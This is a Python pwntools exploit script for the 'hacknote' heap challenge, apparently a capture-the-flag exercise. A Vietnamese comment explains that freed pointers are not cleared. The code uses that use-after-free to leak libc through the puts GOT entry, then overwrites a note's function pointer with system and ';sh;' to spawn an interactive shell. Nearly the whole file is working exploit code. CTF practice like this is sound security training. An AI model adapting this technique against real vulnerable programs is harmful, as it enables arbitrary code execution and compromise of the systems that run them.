from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
interrupt
continue
'''.format(**locals())

#Binary filename
exe = './hacknote_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF('./libc_32.so.6')

'''
Bài lỗi do khi free không set ptr lại về 0 nên chúng ta có thể 
khai thác lỗi UAF và leak được địa chỉ libc
- do đó chỉ cần tạo 2 chunk có data > 0x10 và thực hiện ghi 
địa chỉ hàm để leak địa chỉ libc và viết system_addr và thành công
'''

def add(Size, Content):
    p.sendlineafter('Your choice :', str(1))
    p.sendlineafter('Note size :', str(Size))
    p.sendafter('Content :', Content)
    p.recvuntil('Success !')
def delete(index):
    p.sendlineafter('Your choice :', str(2))
    p.sendlineafter('Index :', str(index))
    p.recvuntil('Success')
def show(index):
    p.sendlineafter('Your choice :', str(3))
    p.sendlineafter('Index :', str(index))

add(16, 'A'*4)
add(16, 'B'*4)
delete(0)
delete(1)
add(8, p32(0x0804862b) + p32(elf.got['puts']))
show(0)
libc.address = u32(p.recv(4))-libc.sym['puts']
success('libc : '  + hex(libc.address))
success('system: ' + hex(libc.sym['system']))

delete(2)
add(8, p32(libc.sym['system'])+b';sh;')
show(0)

p.interactive()
